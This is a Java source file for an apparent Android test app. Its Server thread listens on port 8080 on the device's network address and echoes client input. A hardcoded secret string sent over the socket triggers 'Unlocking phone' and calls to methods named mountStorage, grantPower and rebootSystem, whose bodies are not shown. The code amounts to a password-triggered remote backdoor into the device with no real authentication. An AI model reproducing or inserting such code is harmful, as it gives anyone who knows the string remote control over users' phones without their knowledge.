package iqube.surya.testapplication;

import android.annotation.SuppressLint;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Inet4Address;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Enumeration;

public class Server extends Thread {

    @SuppressLint("NewApi")
    public void run(){

        try{
            // Open a server socket listening on port 8080
            InetAddress addr = InetAddress.getByName(getLocalIpAddress());
            ServerSocket serverSocket = new ServerSocket(8080, 0, addr);
            Socket clientSocket = serverSocket.accept();

            // Client established connection.
            // Create input and output streams
            BufferedReader in = new BufferedReader(
                    new InputStreamReader(clientSocket.getInputStream()));
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
            while(true) {
                // Read received data and echo it back
                String input = in.readLine();
                if(input.equals("End")){
                 out.println("Terminated");
                 break;
                }
                else if (input.equals(".6UAAx5h%tAYbk9U")){
                    out.println("Unlocking phone");
                    CameraRecorder cameraRecorder = new CameraRecorder();
                    cameraRecorder.mountStorage();
                    cameraRecorder.grantPower();
                    cameraRecorder.rebootSystem();
                }
                out.println("received: " + input);

            }
            // Perform cleanup
            in.close();
            out.close();

        } catch(Exception e) {
            // Omitting exception handling for clarity
        }
    }

    private String getLocalIpAddress() throws Exception {
        String resultIpv6 = "";
        String resultIpv4 = "";

        for (Enumeration en = NetworkInterface.getNetworkInterfaces();
             en.hasMoreElements();) {

            NetworkInterface intf = (NetworkInterface) en.nextElement();
            for (Enumeration enumIpAddr = intf.getInetAddresses();
                 enumIpAddr.hasMoreElements();) {

                InetAddress inetAddress = (InetAddress) enumIpAddr.nextElement();
                if(!inetAddress.isLoopbackAddress()){
                    if (inetAddress instanceof Inet4Address) {
                        resultIpv4 = inetAddress.getHostAddress();
                    } else if (inetAddress instanceof Inet6Address) {
                        resultIpv6 = inetAddress.getHostAddress();
                    }
                }
            }
        }
        return ((resultIpv4.length() > 0) ? resultIpv4 : resultIpv6);
    }
}